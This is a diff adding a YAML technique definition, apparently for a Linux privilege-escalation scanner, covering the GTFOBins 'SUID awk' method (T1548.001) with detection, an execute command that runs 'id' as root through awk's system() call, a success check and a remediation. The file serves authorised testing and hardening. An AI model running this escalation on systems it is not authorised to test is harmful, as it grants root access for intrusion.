@@ -1,0 +1,25 @@
+# SUID awk → root (GTFOBins)
+technique: T1548.001
+name: SUID awk → root (GTFOBins)
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: read-only
+  detection: quiet
+detect:
+  suid: awk
+execute:
+  command: "{{binary}} 'BEGIN{system(\"id\")}'"
+verify:
+  success: "uid=0"
+cleanup:
+  command: ""
+report:
+  vector_type: gtfobins_suid
+  description: >
+    SUID awk shells out via a BEGIN block. The system() runs with the
+    SUID context (root).
+  remediation: >
+    Remove the SUID bit from awk.
+  refs: [T1548.001, GTFOBins/awk]
